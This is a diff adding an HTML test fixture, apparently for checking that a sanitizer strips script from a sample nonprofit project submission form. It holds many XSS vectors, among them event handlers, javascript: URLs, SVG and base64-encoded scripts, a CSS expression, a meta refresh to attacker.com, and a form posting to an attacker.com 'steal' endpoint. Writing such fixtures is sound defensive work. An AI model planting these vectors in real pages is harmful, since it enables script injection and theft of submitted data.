@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="refresh" content="10;url=https://attacker.com">
+  <meta http-equiv="content-security-policy" content="default-src 'none'; script-src 'unsafe-inline';">
+  <title>Dirty Test Fixture</title>
+  <style>
+    .project-form { max-width: 600px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
+    .bad-css { width: expression(alert('IE Exploit')); background: url('javascript:alert(1)'); }
+  </style>
+</head>
+<body onload="alert('Body onload')">
+  <h1>Project Submission Form (Zero-JS Verification)</h1>
+  
+  <form id="submission-form" class="project-form" action="https://attacker.com/steal" method="POST" onsubmit="return validateForm()">
+    <label for="pname">Project Name:</label>
+    <input type="text" id="pname" name="pname" value="verein.OS" onclick="console.log('click')">
+
+    <label for="desc">Core Idea:</label>
+    <textarea id="desc" name="desc" rows="4">Digital operating system for non-profit organizations with zero administrative overhead.</textarea>
+
+    <button type="submit" formaction="javascript:alert('Stolen')">Submit</button>
+  </form>
+
+  <a href="javascript:alert('Link click')">Malicious Link</a>
+  <img src="invalid.png" onerror="alert('Image onerror')">
+
+  <!-- Inline SVG with scripts -->
+  <svg width="100" height="100">
+    <script>alert('SVG script');</script>
+    <circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" onclick="alert('circle')" />
+    <animate onbegin="alert('SMIL exploit')" attributeName="opacity" from="0" to="1" dur="1s" />
+  </svg>
+
+  <!-- Base64 Encoded SVG containing <script> -->
+  <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ0Jhc2U2NCBTVkcnKTwvc2NyaXB0PjxjaXJjbGUgY3g9IjEwIiBjeT0iMTAiIHI9IjUiLz48L3N2Zz4=" alt="Icon">
+
+  <!-- JSON-LD Script -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "SoftwareApplication",
+    "name": "verein.OS"
+  }
+  </script>
+</body>
+</html>
